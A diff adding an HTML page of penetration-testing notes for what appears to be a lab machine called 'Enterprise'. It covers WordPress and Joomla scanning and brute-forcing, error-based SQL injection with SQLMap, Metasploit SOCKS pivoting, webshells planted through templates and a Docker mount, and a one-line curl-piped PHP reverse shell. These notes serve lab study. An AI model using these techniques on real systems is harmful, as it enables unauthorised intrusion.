@@ -1,0 +1,67 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Enterprise - Error Based SQLi MSF Socks WP Joomla</title>
+</head><body>Certificate information to obtain email/user information/hostname<br/>
+<br/>
+WPScan<br/>
+JoomaVS<br/>
+<br/>
+<br/>
+Error based SQLi, tough to do manually. Better to do with a script, whether custom or SQLMap...<br/>
+<br/>
+less -S to disable wordwrapping, nifty<br/>
+<br/>
+using wpscan to brute wp-login<br/>
+<br/>
+Curl and pipe shell directly to binary (ie curl php_rev_shell | php)<br/>
+ip neigh&#09;&#09;#replaces the arp command<br/>
+<br/>
+exploit -j &#09;&#09;#auto move job to background<br/>
+<br/>
+check your working directories for noexec if you get a permission denied when executing binaries on linux<br/>
+<br/>
+MSF usr auxiliary/server/socks4a<br/>
+SRVHOST 0.0.0.0<br/>
+SRVPOR 1080<br/>
+run<br/>
+<br/>
+MSF add route<br/>
+route add &lt;RHOST&gt; &lt;session_id&gt;<br/>
+<br/>
+ensure /etc/proxychains.conf is setup to use sock4a<br/>
+127.0.0.1 1080<br/>
+<br/>
+another option in this case would be to use a reverse SSH connection, or even possibly a reverse dynamic ssh connection from Enterprise to attacker machine. This way you wouldn't need MSF. <br/>
+<br/>
+mysql:<br/>
+describe &lt;table&gt;;&#09;&#09;#will just print schema out<br/>
+<br/>
+Can exploit joomla much in the same way as wordpress. Attempt to edit templates and throw up some nice php code.<br/>
+<br/>
+Interesting pivoting<br/>
+Docker containers were mounting a directory on the actual host in the web directory. Exploiting the docker container and placing a webshell in the mount, allowed the host to serv up a shell and gain access to the underlying OS.<br/>
+<br/>
+There is a benefit to analyzing binaries with both strace and ltrace before decompiling.<br/>
+<br/>
+Ret2LibC template in useful artifacts and in the buffer overflow section<br/>
+<br/>
+Editing files without nano/vim<br/>
+$ cat - &gt; test.txt<br/>
+typing<br/>
+typing <ul><li style="list-style-type: none">data</li>
+</ul>
+<br/>
+Ctrl + C<br/>
+<br/>
+-------------------------------------------<br/>
+Extra Content<br/>
+SQL error-based automation and SQLMap proxy<br/>
+<br/>
+wp-settings.php<br/>
+wp_magic_quotes();&#09;&#09;#this will alter the way data is passed to the applications (escaping or otherwise)<br/>
+<br/>
+<br/>
+sqlmap has a --proxy=http://127.0.0.1:8080 flag that you can send to BURP or another tool<br/>
+</body></html>
